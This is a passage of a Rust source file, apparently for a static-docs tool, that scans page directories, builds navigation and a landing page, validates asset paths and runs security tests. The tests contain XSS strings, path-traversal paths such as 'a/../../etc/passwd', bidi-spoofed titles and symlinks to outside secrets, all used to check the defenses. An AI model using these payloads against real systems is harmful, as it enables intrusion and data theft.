    if meta.file_type().is_symlink() {
        return Err(ScanError::Symlink(path.to_path_buf()));
    }
    if !meta.is_file() {
        return Err(ScanError::UnsupportedFileType(path.to_path_buf()));
    }
    // Read at most (per-file cap ∧ remaining per-space budget) + 1, then verify —
    // the `+1` lets us detect an over-limit file without trusting the stat length.
    let remaining = MAX_SPACE_BYTES.saturating_sub(*total);
    let limit = MAX_FILE_BYTES.min(remaining);
    let f = std::fs::File::open(path).map_err(|e| ScanError::Io(path.to_path_buf(), e))?;
    // Re-check via the opened descriptor (defends the common swap-after-lstat case).
    if !f
        .metadata()
        .map_err(|e| ScanError::Io(path.to_path_buf(), e))?
        .is_file()
    {
        return Err(ScanError::UnsupportedFileType(path.to_path_buf()));
    }
    let mut buf = Vec::new();
    f.take(limit + 1)
        .read_to_end(&mut buf)
        .map_err(|e| ScanError::Io(path.to_path_buf(), e))?;
    let len = buf.len() as u64;
    if len > MAX_FILE_BYTES {
        return Err(ScanError::FileTooLarge(path.to_path_buf(), len));
    }
    *total = total.saturating_add(len);
    if *total > MAX_SPACE_BYTES {
        return Err(ScanError::SpaceTooLarge(*total));
    }
    Ok(buf)
}

/// After all files are read, compute nav order (manifest, else lexicographic),
/// reconcile any grouped nav against the real artifact set, generate the landing
/// index when the space has no home page, and resolve the home slug (`index` >
/// `home` > first in nav order).
///
/// Order matters: the flat `nav` (the shell's complete allowlist) and the grouped
/// nav are both finalized against the artifact set *before* the landing is
/// generated, so the landing lists a reconciled structure; the generated `index`
/// is then inserted and becomes the home.
///
/// `total_bytes` is the caller's running per-space byte total (all artifacts + assets
/// read so far). The generated landing is only inserted if it keeps the space within
/// every cap (`MAX_FILE_BYTES`, `MAX_ENTRIES`, `MAX_SPACE_BYTES`) — a derived landing
/// must never breach the immutable-snapshot invariants; if it would, the space falls
/// back to first-artifact home (the pre-landing behavior).
fn finalize(space: &mut Space, total_bytes: u64) {
    // Manifest nav may have listed slugs; keep only ones that exist, **deduped**
    // (a manifest `nav: [a, a]` must not double the entry), then append any
    // remaining artifacts in lexicographic order so nothing is hidden. A `HashSet`
    // keeps this linear instead of O(artifacts × nav).
    let mut nav: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();
    for s in &space.nav {
        if space.artifacts.contains_key(s) && seen.insert(s.clone()) {
            nav.push(s.clone());
        }
    }
    for slug in space.artifacts.keys() {
        if seen.insert(slug.clone()) {
            nav.push(slug.clone());
        }
    }
    space.nav = nav;

    // Reconcile grouped nav against reality (keep only existing slugs, one level of
    // nesting, dedupe, drop empty groups). Empty afterwards → the flat-nav fallback.
    reconcile_nav_groups(space);

    // Generate a landing page when the space declares no home page (`index`/`home`).
    // It replaces the old first-artifact redirect stub with a real grouped/flat
    // index — structure only (a table of contents), never authored content.
    //
    // Gated so it only fires where it adds value: a home page must be absent AND the
    // space must either declare grouped nav or hold **at least two** pages. A single
    // ungrouped page keeps the old behavior (home = that page; a static `build`
    // redirects index.html → it) — a one-link landing would be worse UX than just
    // showing the page.
    let has_home_page =
        space.artifacts.contains_key("index") || space.artifacts.contains_key("home");
    let worth_a_landing = !space.nav_groups.is_empty() || space.nav.len() >= 2;
    if !has_home_page && worth_a_landing {
        let title = space
            .title
            .clone()
            .filter(|t| !t.is_empty())
            .unwrap_or_else(|| "Index".to_string());
        let html = generate_landing_body(space, &title);
        let len = html.len() as u64;
        let new_entries = space.artifacts.len() + space.assets.len() + 1;
        // Only add the landing if it stays within every space cap; otherwise fall
        // back to first-artifact home. A derived landing is optional — it must never
        // push the immutable snapshot past MAX_FILE_BYTES / MAX_ENTRIES /
        // MAX_SPACE_BYTES (which the scanner + bundle builder enforce on real files
        // *before* finalize runs). This also keeps local scan and hosted ingest in
        // agreement — neither accepts a space the other would reject.
        if len <= MAX_FILE_BYTES
            && new_entries <= MAX_ENTRIES
            && total_bytes.saturating_add(len) <= MAX_SPACE_BYTES
        {
            // `index` is guaranteed free here (no `index`/`home` artifact exists).
            space.artifacts.insert(
                "index".to_string(),
                Artifact {
                    html,
                    title: title.clone(),
                },
            );
            // Surface the generated landing first in the flat allowlist.
            space.nav.insert(0, "index".to_string());
        }
    }

    space.home = if space.artifacts.contains_key("index") {
        Some("index".to_string())
    } else if space.artifacts.contains_key("home") {
        Some("home".to_string())
    } else {
        space.nav.first().cloned()
    };
}

/// Reconcile `space.nav_groups` against the scanned artifact set: drop members (and
/// nested children) whose slug is not a real artifact, dedupe slugs across the whole
/// grouped structure (first mention wins, so a slug never appears twice in the
/// sidebar), enforce one level of nesting (defensively re-clear grandchildren),
/// drop groups left with no members, and bound the group/member counts. An empty
/// result restores the flat-nav fallback. The flat `space.nav` is untouched — it
/// stays the complete allowlist even when groups curate a display subset.
fn reconcile_nav_groups(space: &mut Space) {
    if space.nav_groups.is_empty() {
        return;
    }
    let groups = std::mem::take(&mut space.nav_groups);
    let mut seen: HashSet<String> = HashSet::new();
    let mut out: Vec<NavGroup> = Vec::new();
    // Bound work on the **raw** input, not just the accepted output: stop after
    // examining `MAX_NAV_GROUPS` groups, and within a group after examining
    // `MAX_GROUP_MEMBERS` submitted members **plus their children** (the documented
    // "incl. nested children" cap). Counting *examined* (not accepted) entries means a
    // flood of dangling/duplicate entries at the untrusted ingest boundary can't force
    // unbounded reconciliation work — DoS defense on top of correctness.
    for (gi, group) in groups.into_iter().enumerate() {
        if gi >= MAX_NAV_GROUPS {
            break;
        }
        let mut examined = 0usize;
        let mut members: Vec<NavMember> = Vec::new();
        for member in group.members {
            if examined >= MAX_GROUP_MEMBERS {
                break;
            }
            examined += 1;
            if !space.artifacts.contains_key(&member.slug) || !seen.insert(member.slug.clone()) {
                continue;
            }
            let mut children: Vec<NavMember> = Vec::new();
            for child in member.children {
                if examined >= MAX_GROUP_MEMBERS {
                    break;
                }
                examined += 1;
                if space.artifacts.contains_key(&child.slug) && seen.insert(child.slug.clone()) {
                    children.push(NavMember {
                        slug: child.slug,
                        title: sanitize_label(child.title.as_deref(), MAX_TITLE_CHARS),
                        desc: sanitize_label(child.desc.as_deref(), MAX_DESC_CHARS),
                        children: Vec::new(), // one level only — grandchildren discarded
                    });
                }
            }
            members.push(NavMember {
                slug: member.slug,
                title: sanitize_label(member.title.as_deref(), MAX_TITLE_CHARS),
                desc: sanitize_label(member.desc.as_deref(), MAX_DESC_CHARS),
                children,
            });
        }
        if !members.is_empty() {
            out.push(NavGroup {
                label: sanitize_label(Some(&group.label), MAX_TITLE_CHARS).unwrap_or_default(),
                members,
            });
        }
    }
    space.nav_groups = out;
}

/// Build the generated landing page body — a `gp-prose` fragment listing the space's
/// docs grouped as the manifest declares (each with an optional short description),
/// or a flat list of all pages when no groups are declared. Structure only: every
/// link targets a real slug (`<slug>.html`, which the bridge intercepts in-frame and
/// a static build resolves natively), and every producer/artifact-derived string is
/// HTML-escaped. The `<h1>` is the space title so [`resolve_title`] recovers it.
fn generate_landing_body(space: &Space, heading: &str) -> String {
    let mut out = String::from("<article class=\"gp-prose\">\n");
    out.push_str(&format!("<h1>{}</h1>\n", html_escape(heading)));
    if space.nav_groups.is_empty() {
        // Flat fallback: list every page in nav order (the generated `index` is not
        // inserted yet, so it never lists itself).
        out.push_str("<ul class=\"gp-index-list\">\n");
        for slug in &space.nav {
            out.push_str("<li>");
            append_item_inner(&mut out, space, slug, None, None);
            out.push_str("</li>\n");
        }
        out.push_str("</ul>\n");
    } else {
        for group in &space.nav_groups {
            out.push_str("<section class=\"gp-index-group\">\n");
            // Omit the heading entirely for an empty label (a spoof-only label that
            // sanitized to "") — never emit an empty `<h2></h2>` (ugly + screen-reader
            // hostile). Mirrors the shell sidebar, which also skips the empty heading.
            if !group.label.is_empty() {
                out.push_str(&format!("<h2>{}</h2>\n", html_escape(&group.label)));
            }
            out.push_str("<ul class=\"gp-index-list\">\n");
            for member in &group.members {
                append_landing_member(&mut out, space, member);
            }
            out.push_str("</ul>\n");
            out.push_str("</section>\n");
        }
    }
    out.push_str("</article>\n");
    out
}

/// Append one grouped landing member as a `<li>` containing its link + description
/// and, when it has companion children, a nested `<ul>` of child `<li>`s (one level).
fn append_landing_member(out: &mut String, space: &Space, member: &NavMember) {
    out.push_str("<li>");
    append_item_inner(
        out,
        space,
        &member.slug,
        member.title.as_deref(),
        member.desc.as_deref(),
    );
    if !member.children.is_empty() {
        out.push_str("<ul class=\"gp-index-children\">\n");
        for child in &member.children {
            out.push_str("<li>");
            append_item_inner(
                out,
                space,
                &child.slug,
                child.title.as_deref(),
                child.desc.as_deref(),
            );
            out.push_str("</li>\n");
        }
        out.push_str("</ul>\n");
    }
    out.push_str("</li>\n");
}

/// Append the inner content of a landing item (the `<a>` link plus an optional
/// description) — no surrounding `<li>`, so the caller controls nesting. Title
/// precedence: manifest override → artifact title → slug. Description precedence:
/// manifest `desc` → the doc's first paragraph → none. All inserted as escaped text;
/// the href is `<slug>.html` (the slug grammar excludes every URL/HTML
/// metacharacter, and it is escaped regardless).
fn append_item_inner(
    out: &mut String,
    space: &Space,
    slug: &str,
    title_override: Option<&str>,
    desc_override: Option<&str>,
) {
    let title = title_override
        .map(|s| s.to_string())
        .or_else(|| space.artifact(slug).map(|a| a.title.clone()))
        .unwrap_or_else(|| slug.to_string());
    let desc = desc_override.map(|s| s.to_string()).or_else(|| {
        space
            .artifact(slug)
            .and_then(|a| extract_description(&a.html))
    });
    out.push_str(&format!(
        "<a href=\"{}.html\">{}</a>",
        html_escape(slug),
        html_escape(&title)
    ));
    if let Some(d) = desc.filter(|d| !d.is_empty()) {
        out.push_str(&format!(
            " — <span class=\"gp-index-desc\">{}</span>",
            html_escape(&d)
        ));
    }
}

/// Escape text for insertion into the generated landing HTML (a server-generated
/// document). Covers the text and double-quoted-attribute contexts used there.
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}

/// Parse the optional `glasspad.yaml` — **structure only** (title, nav order, and —
/// for markdown-native spaces — the built-in `template` name applied to `.md` pages).
/// Unknown keys are ignored; a syntactically invalid file is a hard error. The
/// resolved `template:` string is written to `template_ref` (validated later, once,
/// by [`resolve_space_template`]).
fn apply_manifest(
    text: &str,
    path: &Path,
    space: &mut Space,
    template_ref: &mut Option<String>,
) -> Result<(), ScanError> {
    // A group member is either a bare slug string (`- intent`) or a map with an
    // optional display `title`, a landing `desc`, and one level of companion
    // `children`. `#[serde(untagged)]` accepts both spellings in the same list.
    #[derive(serde::Deserialize)]
    #[serde(untagged)]
    enum ManifestMember {
        Slug(String),
        Full {
            slug: String,
            #[serde(default)]
            title: Option<String>,
            #[serde(default)]
            desc: Option<String>,
            #[serde(default)]
            children: Vec<ManifestMember>,
        },
    }
    #[derive(serde::Deserialize)]
    struct ManifestGroup {
        label: String,
        #[serde(default)]
        members: Vec<ManifestMember>,
    }
    #[derive(serde::Deserialize, Default)]
    struct Manifest {
        #[serde(default)]
        title: Option<String>,
        #[serde(default)]
        nav: Vec<String>,
        #[serde(default)]
        template: Option<String>,
        #[serde(default)]
        groups: Vec<ManifestGroup>,
    }
    let m: Manifest = serde_yaml::from_str(text)
        .map_err(|e| ScanError::Manifest(path.to_path_buf(), e.to_string()))?;
    if let Some(t) = m.template {
        let t = t.trim();
        if !t.is_empty() {
            *template_ref = Some(t.to_string());
        }
    }
    if let Some(t) = m.title {
        space.title = sanitize_html_label(&t, MAX_TITLE_CHARS);
    }
    // Record the requested nav order; `finalize` reconciles it against reality.
    space.nav = m.nav;
    // Convert manifest groups into the canonical structure-only shape. Labels /
    // titles / descriptions are carried through RAW here; they are sanitized once,
    // centrally, in [`reconcile_nav_groups`] (which `finalize` runs) so the hosted
    // wire path gets the identical treatment. `children` is flattened to ONE level
    // here (a grandchild's own `children` is discarded — the nav is one-level-
    // nestable by contract, the space-docsite-nav issue).
    fn convert_member(m: ManifestMember, depth: u8) -> NavMember {
        match m {
            ManifestMember::Slug(slug) => NavMember {
                slug,
                ..Default::default()
            },
            ManifestMember::Full {
                slug,
                title,
                desc,
                children,
            } => NavMember {
                slug,
                title,
                desc,
                // One level only: a child never carries its own children.
                children: if depth == 0 {
                    children
                        .into_iter()
                        .map(|c| convert_member(c, depth + 1))
                        .collect()
                } else {
                    Vec::new()
                },
            },
        }
    }
    space.nav_groups = m
        .groups
        .into_iter()
        .map(|g| NavGroup {
            label: g.label,
            members: g
                .members
                .into_iter()
                .map(|mem| convert_member(mem, 0))
                .collect(),
        })
        .collect();
    Ok(())
}

/// The `.html` filename stem, or `None` for non-HTML files.
fn html_stem(name: &str) -> Option<&str> {
    for ext in [".html", ".htm"] {
        if let Some(stem) = name.strip_suffix(ext) {
            return Some(stem);
        }
    }
    None
}

/// The `.md`/`.markdown` filename stem, or `None` for non-markdown files — the
/// markdown-native-space counterpart of [`html_stem`]. The match is
/// case-insensitive on the extension (`README.MD` is markdown too); the stem itself
/// is returned unchanged and validated against the slug grammar by the caller.
/// Called for every top-level entry, so it is allocation-free: it compares the
/// suffix **bytes** with `eq_ignore_ascii_case` (no `to_ascii_lowercase` allocation)
/// — byte comparison also sidesteps any char-boundary panic on a non-ASCII name.
fn md_stem(name: &str) -> Option<&str> {
    let bytes = name.as_bytes();
    for ext in [".md", ".markdown"] {
        let e = ext.as_bytes();
        if bytes.len() >= e.len() && bytes[bytes.len() - e.len()..].eq_ignore_ascii_case(e) {
            return Some(&name[..name.len() - e.len()]);
        }
    }
    None
}

/// Asset path-segment grammar. Mixed case allowed (agents name files freely);
/// `.`/`..`/empty are excluded because they never appear as `Normal` components.
fn valid_asset_segment(s: &str) -> bool {
    !s.is_empty()
        && s != "."
        && s != ".."
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_'))
}

/// Validate a request-supplied asset sub-path (`{*path}` after `/{space}/assets/`).
/// Returns the space-relative key (`assets/...`) to look up in the pre-scanned map,
/// or `None` if any segment is malformed / a traversal token. The map lookup is
/// the real allowlist; this is defense-in-depth so a bad path can't even form a key.
pub fn asset_key_for_request(path: &str) -> Option<String> {
    if path.is_empty() {
        return None;
    }
    let mut segs = vec![ASSETS_DIR.to_string()];
    for seg in path.split('/') {
        if !valid_asset_segment(seg) {
            return None;
        }
        segs.push(seg.to_string());
    }
    Some(segs.join("/"))
}

/// Extension → MIME allowlist. Unknown extensions fall back to
/// `application/octet-stream`; every asset response also carries `nosniff`, so a
/// wrong guess can never be upgraded to an executable type by the browser.
pub fn mime_for(path: &Path) -> &'static str {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "bmp" => "image/bmp",
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "eot" => "application/vnd.ms-fontobject",
        "wasm" => "application/wasm",
        "txt" | "md" => "text/plain; charset=utf-8",
        "csv" => "text/csv; charset=utf-8",
        "xml" => "application/xml; charset=utf-8",
        "pdf" => "application/pdf",
        "mp4" => "video/mp4",
        "webm" => "video/webm",
        "mp3" => "audio/mpeg",
        "wav" => "audio/wav",
        _ => "application/octet-stream",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn snapshot_clone_shares_space_body_storage() {
        let snapshot = Snapshot {
            spaces: BTreeMap::from([(
                "demo".to_string(),
                Arc::new(Space {
                    artifacts: BTreeMap::from([(
                        "index".to_string(),
                        Artifact {
                            html: "<h1>shared body</h1>".to_string(),
                            title: "shared body".to_string(),
                        },
                    )]),
                    ..Space::default()
                }),
            )]),
        };

        let cloned = snapshot.clone();
        let original_space = snapshot.spaces.get("demo").unwrap();
        let cloned_space = cloned.spaces.get("demo").unwrap();
        assert!(Arc::ptr_eq(original_space, cloned_space));
        assert_eq!(Arc::strong_count(original_space), 2);
    }

    #[test]
    fn title_prefers_title_tag_then_h1() {
        assert_eq!(
            resolve_title("<html><head><title>Sales Q3</title></head><body><h1>Other</h1>"),
            Some("Sales Q3".to_string())
        );
        assert_eq!(
            resolve_title("<body><h1>Just a Heading</h1></body>"),
            Some("Just a Heading".to_string())
        );
        assert_eq!(resolve_title("<p>no title here</p>"), None);
    }

    #[test]
    fn title_is_attribute_and_case_tolerant() {
        assert_eq!(
            resolve_title(r#"<TITLE lang="en">  Mixed  Case  </TITLE>"#),
            Some("Mixed Case".to_string())
        );
        // A tag that merely starts with the name must not match (`<titlebar>`).
        assert_eq!(
            resolve_title("<titlebar>x</titlebar><title>Real</title>"),
            Some("Real".to_string())
        );
    }

    #[test]
    fn title_decodes_entities_and_strips_nested_tags() {
        assert_eq!(
            resolve_title("<title>A &amp; B &lt;ok&gt;</title>"),
            Some("A & B <ok>".to_string())
        );
        assert_eq!(
            resolve_title("<h1>Hi <span class=x>there</span></h1>"),
            Some("Hi there".to_string())
        );
        assert_eq!(
            resolve_title("<title>caf&#233;</title>"),
            Some("café".to_string())
        );
    }

    #[test]
    fn title_skips_comments_and_lookalike_close_tags() {
        // A commented-out title must not win over the real one.
        assert_eq!(
            resolve_title("<!-- <title>Fake</title> --><title>Real</title>"),
            Some("Real".to_string())
        );
        // `</titlebar>` must not close `<title>`.
        assert_eq!(
            resolve_title("<title>Kept</title>bar text"),
            Some("Kept".to_string())
        );
        assert_eq!(
            resolve_title("<title>Real <x>y</x></title>"),
            Some("Real y".to_string())
        );
    }

    #[test]
    fn title_tolerates_gt_inside_quoted_attribute() {
        assert_eq!(
            resolve_title(r#"<title data-x="a>b">Real Title</title>"#),
            Some("Real Title".to_string())
        );
    }

    #[test]
    fn title_self_closing_has_no_text() {
        // `<title/>` yields nothing → fall through to h1.
        assert_eq!(
            resolve_title("<title/><h1>Heading</h1>"),
            Some("Heading".to_string())
        );
    }

    #[test]
    fn title_nbsp_entity_collapses() {
        assert_eq!(
            resolve_title("<title>a&nbsp;&nbsp;b</title>"),
            Some("a b".to_string())
        );
    }

    #[test]
    fn title_length_bounded() {
        let long = "x".repeat(500);
        let html = format!("<title>{long}</title>");
        assert_eq!(
            resolve_title(&html).unwrap().chars().count(),
            MAX_TITLE_CHARS
        );
    }

    #[test]
    fn title_injection_stays_inert_text() {
        // A hostile title is extracted as plain text; the shell inserts it via
        // textContent, so this can never become live markup.
        let t = resolve_title(r#"<title></title><script>alert(1)</script>"#);
        // Empty title element → falls through to h1 (none) → None.
        assert_eq!(t, None);
        // A nested tag inside the title is stripped; the surviving text is inert.
        let t2 = resolve_title(r#"<title>x"><img src=x onerror=alert(1)></title>"#).unwrap();
        assert!(!t2.contains("<img"));
        assert!(!t2.contains("onerror")); // the <img …> was stripped entirely
        assert_eq!(t2, "x\"");
    }

    #[test]
    fn title_tolerates_leading_bom_and_non_ascii_without_panicking() {
        // Regression: the byte-walking scanner must not slice a `str` at a byte
        // index inside a multi-byte char. A leading BOM (`create` / `serve` of a
        // BOM-prefixed artifact) and a non-ASCII text prefix before the first tag
        // both used to panic the server on scan.
        assert_eq!(
            resolve_title("\u{feff}<!doctype html><title>Home</title>"),
            Some("Home".to_string())
        );
        assert_eq!(
            resolve_title("café ☕ before any tag <h1>Heading</h1>"),
            Some("Heading".to_string())
        );
        // A BOM directly before a comment then a title (comment-skip path).
        assert_eq!(
            resolve_title("\u{feff}<!-- ☕ --><title>Real</title>"),
            Some("Real".to_string())
        );
        // Non-ASCII everywhere, no title/h1 → None, still no panic.
        assert_eq!(resolve_title("\u{feff}just café ☕ text, no tags"), None);
    }

    #[test]
    fn title_strips_bidi_and_zero_width_spoofing_chars() {
        // A bidi override / zero-width run in a title can reorder or hide the
        // visible label in the trusted nav; they must be stripped at resolution.
        assert_eq!(
            resolve_title("<title>Invoice \u{202e}txt.exe</title>"),
            Some("Invoice txt.exe".to_string())
        );
        assert_eq!(
            resolve_title("<title>a\u{200b}\u{200b}b\u{feff}c</title>"),
            Some("abc".to_string())
        );
        // A non-whitespace C0 control is removed, not rendered.
        assert_eq!(
            resolve_title("<title>ok\u{0007}now</title>"),
            Some("oknow".to_string())
        );
        // A title that is ONLY invisible chars collapses to nothing → None.
        assert_eq!(
            resolve_title("<title>\u{202e}\u{200b}\u{feff}</title>"),
            None
        );
    }

    #[test]
    fn sanitize_label_is_idempotent_and_not_entity_decoded() {
        // Producer labels are plain text, NOT HTML: `&amp;` stays literal (a label is
        // not entity-decoded), zero-width spoof chars are stripped, whitespace folded.
        let once = sanitize_label(Some("R&amp;D  \u{200b}core"), MAX_TITLE_CHARS).unwrap();
        assert_eq!(once, "R&amp;D core");
        // Idempotent across the scan→wire→ingest→reload passes: f(f(x)) == f(x).
        let twice = sanitize_label(Some(&once), MAX_TITLE_CHARS).unwrap();
        assert_eq!(once, twice);
        // A spoof/whitespace-only label sanitizes to None.
        assert_eq!(
            sanitize_label(Some("\u{202e}\u{200b}  "), MAX_TITLE_CHARS),
            None
        );
    }

    #[test]
    fn asset_request_key_rejects_traversal() {
        assert_eq!(
            asset_key_for_request("data.json"),
            Some("assets/data.json".to_string())
        );
        assert_eq!(
            asset_key_for_request("sub/logo.svg"),
            Some("assets/sub/logo.svg".to_string())
        );
        assert_eq!(asset_key_for_request(""), None);
        assert_eq!(asset_key_for_request("../secret"), None);
        assert_eq!(asset_key_for_request("a/../../etc/passwd"), None);
        assert_eq!(asset_key_for_request("."), None);
        assert_eq!(asset_key_for_request("a//b"), None); // empty segment
        assert_eq!(asset_key_for_request("a/b/"), None);
        assert_eq!(asset_key_for_request("bad name.js"), None); // space
        assert_eq!(asset_key_for_request("weird\\path"), None); // backslash
    }

    #[test]
    fn mime_detection() {
        assert_eq!(mime_for(Path::new("a.css")), "text/css; charset=utf-8");
        assert_eq!(
            mime_for(Path::new("a.JS")),
            "text/javascript; charset=utf-8"
        );
        assert_eq!(mime_for(Path::new("a.svg")), "image/svg+xml");
        assert_eq!(
            mime_for(Path::new("a.unknownext")),
            "application/octet-stream"
        );
        assert_eq!(mime_for(Path::new("noext")), "application/octet-stream");
    }

    #[test]
    fn html_stem_only_matches_html() {
        assert_eq!(html_stem("index.html"), Some("index"));
        assert_eq!(html_stem("a.htm"), Some("a"));
        assert_eq!(html_stem("data.json"), None);
        assert_eq!(html_stem("noext"), None);
    }

    #[test]
    fn md_stem_matches_markdown_extensions_case_insensitively() {
        assert_eq!(md_stem("index.md"), Some("index"));
        assert_eq!(md_stem("guide.markdown"), Some("guide"));
        assert_eq!(md_stem("README.MD"), Some("README")); // stem unchanged; caller validates
        assert_eq!(md_stem("a.html"), None);
        assert_eq!(md_stem("data.json"), None);
        assert_eq!(md_stem("noext"), None);
    }

    #[test]
    fn resolve_space_template_defaults_to_prose_and_rejects_unknown() {
        let root = Path::new(".");
        let canon = std::fs::canonicalize(root).unwrap();
        let mut total = 0;
        let prose = resolve_space_template(None, root, &canon, &mut total).unwrap();
        assert_eq!(prose.source, render::builtin_template("prose").unwrap());
        assert!(!prose.is_custom);
        assert!(matches!(
            resolve_space_template(Some("nope"), root, &canon, &mut total),
            Err(ScanError::UnknownTemplate(_))
        ));
    }

    // --- bundle builder (hosted space ingest) ------------------------------

    fn page(slug: &str, html: &str) -> BundlePage {
        BundlePage {
            slug: slug.to_string(),
            html: html.to_string(),
        }
    }

    #[test]
    fn bundle_builds_multi_page_space_with_nav_home_and_titles() {
        let space = build_space_bundle(
            vec![
                page("index", "<title>Home</title><h1>hi</h1>"),
                page("guide", "<h1>Guide</h1>"),
            ],
            vec![BundleAsset {
                path: "logo.svg".into(),
                bytes: b"<svg></svg>".to_vec(),
            }],
            vec!["guide".into(), "index".into()],
            vec![],
            Some("My Docs".into()),
        )
        .unwrap();
        assert_eq!(space.artifacts.len(), 2);
        assert_eq!(space.artifact("index").unwrap().title, "Home");
        assert_eq!(space.artifact("guide").unwrap().title, "Guide");
        // nav honors the manifest order; home is still `index` (index > home > first).
        assert_eq!(space.nav, vec!["guide".to_string(), "index".to_string()]);
        assert_eq!(space.home.as_deref(), Some("index"));
        assert_eq!(space.title.as_deref(), Some("My Docs"));
        assert_eq!(
            space.asset("assets/logo.svg").unwrap().content_type,
            "image/svg+xml"
        );
    }

    #[test]
    fn bundle_rejects_reserved_bad_and_duplicate_slugs() {
        assert!(matches!(
            build_space_bundle(vec![page("api", "x")], vec![], vec![], vec![], None),
            Err(BundleError::ReservedSlug(_))
        ));
        assert!(matches!(
            build_space_bundle(vec![page("Bad Name", "x")], vec![], vec![], vec![], None),
            Err(BundleError::BadSlug(_))
        ));
        assert!(matches!(
            build_space_bundle(
                vec![page("a", "x"), page("a", "y")],
                vec![],
                vec![],
                vec![],
                None
            ),
            Err(BundleError::DuplicateSlug(_))
        ));
    }

    #[test]
    fn bundle_rejects_empty_and_bad_asset_paths() {
        assert!(matches!(
            build_space_bundle(vec![], vec![], vec![], vec![], None),
            Err(BundleError::Empty)
        ));
        for bad in [
            "../secret",
            "a/../b",
            "assets/logo.svg",
            "",
            "a//b",
            "bad name",
        ] {
            let r = build_space_bundle(
                vec![page("index", "x")],
                vec![BundleAsset {
                    path: bad.into(),
                    bytes: b"x".to_vec(),
                }],
                vec![],
                vec![],
                None,
            );
            assert!(
                matches!(r, Err(BundleError::BadAssetPath(_))),
                "path {bad:?} should be rejected, got {r:?}"
            );
        }
    }

    #[test]
    fn bundle_enforces_per_file_and_per_space_caps() {
        let big = "a".repeat((MAX_FILE_BYTES + 1) as usize);
        assert!(matches!(
            build_space_bundle(vec![page("index", &big)], vec![], vec![], vec![], None),
            Err(BundleError::FileTooLarge(_, _))
        ));
    }
}

// --- filesystem-level adversarial tests (scanner is the security surface) ---
#[cfg(test)]
mod fs_tests {
    use super::*;
    use std::sync::atomic::{AtomicU32, Ordering};

    static COUNTER: AtomicU32 = AtomicU32::new(0);

    /// A throwaway temp directory, cleaned up on drop.
    struct TempDir(PathBuf);
    impl TempDir {
        fn new() -> Self {
            let n = COUNTER.fetch_add(1, Ordering::Relaxed);
            let p =
                std::env::temp_dir().join(format!("glasspad-space-{}-{}", std::process::id(), n));
            std::fs::create_dir_all(&p).unwrap();
            TempDir(p)
        }
        fn path(&self) -> &Path {
            &self.0
        }
        fn write(&self, rel: &str, contents: &[u8]) {
            let p = self.0.join(rel);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(p, contents).unwrap();
        }
    }
    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn scans_artifacts_assets_and_resolves_home_title() {
        let d = TempDir::new();
        d.write("index.html", b"<title>Home</title><h1>hi</h1>");
        d.write("sales.html", b"<h1>Sales Q3</h1>");
        d.write("assets/data.json", b"{\"a\":1}");
        d.write("assets/sub/logo.svg", b"<svg></svg>");
        let space = scan_dir(d.path()).unwrap();

        assert_eq!(space.artifacts.len(), 2);
        assert_eq!(space.artifact("index").unwrap().title, "Home");
        assert_eq!(space.artifact("sales").unwrap().title, "Sales Q3");
        assert_eq!(space.home.as_deref(), Some("index"));
        assert_eq!(space.nav, vec!["index".to_string(), "sales".to_string()]);
        assert!(space.asset("assets/data.json").is_some());
        assert_eq!(
            space.asset("assets/sub/logo.svg").unwrap().content_type,
            "image/svg+xml"
        );
    }

    #[test]
    fn reserved_slug_is_hard_error() {
        let d = TempDir::new();
        d.write("api.html", b"x"); // `api` is reserved
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::ReservedSlug(_, _))
        ));
    }

    #[test]
    fn bad_slug_is_hard_error() {
        let d = TempDir::new();
        d.write("Bad Name.html", b"x");
        assert!(matches!(scan_dir(d.path()), Err(ScanError::BadSlug(_, _))));
    }

    #[test]
    fn duplicate_slug_across_html_extensions_is_hard_error() {
        let d = TempDir::new();
        d.write("page.html", b"x");
        d.write("page.htm", b"y"); // same stem → collision
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::DuplicateSlug(_, _))
        ));
    }

    #[test]
    fn oversize_file_is_hard_error() {
        let d = TempDir::new();
        d.write("index.html", &vec![b'a'; (MAX_FILE_BYTES + 1) as usize]);
        assert!(matches!(
            scan_dir(d.path()),
            Err(ScanError::FileTooLarge(_, _))
        ));
    }

    #[test]
    fn non_utf8_artifact_is_hard_error() {
        let d = TempDir::new();
        d.write("index.html", &[0xff, 0xfe, 0x00]);
        assert!(matches!(scan_dir(d.path()), Err(ScanError::NotUtf8(_))));
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_artifact_is_rejected() {
        let d = TempDir::new();
        // A symlink whose target is a real secret outside the space.
        let secret = std::env::temp_dir().join(format!("glasspad-secret-{}", std::process::id()));
        std::fs::write(&secret, b"<h1>SECRET</h1>").unwrap();
        std::os::unix::fs::symlink(&secret, d.path().join("index.html")).unwrap();
        let r = scan_dir(d.path());
        let _ = std::fs::remove_file(&secret);
        assert!(matches!(r, Err(ScanError::Symlink(_))), "got {r:?}");
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_asset_is_rejected() {
        let d = TempDir::new();
        d.write("index.html", b"<h1>ok</h1>");
        let secret =
            std::env::temp_dir().join(format!("glasspad-asset-secret-{}", std::process::id()));
        std::fs::write(&secret, b"leak").unwrap();
        std::fs::create_dir_all(d.path().join("assets")).unwrap();
        std::os::unix::fs::symlink(&secret, d.path().join("assets/leak.txt")).unwrap();
        let r = scan_dir(d.path());
        let _ = std::fs::remove_file(&secret);
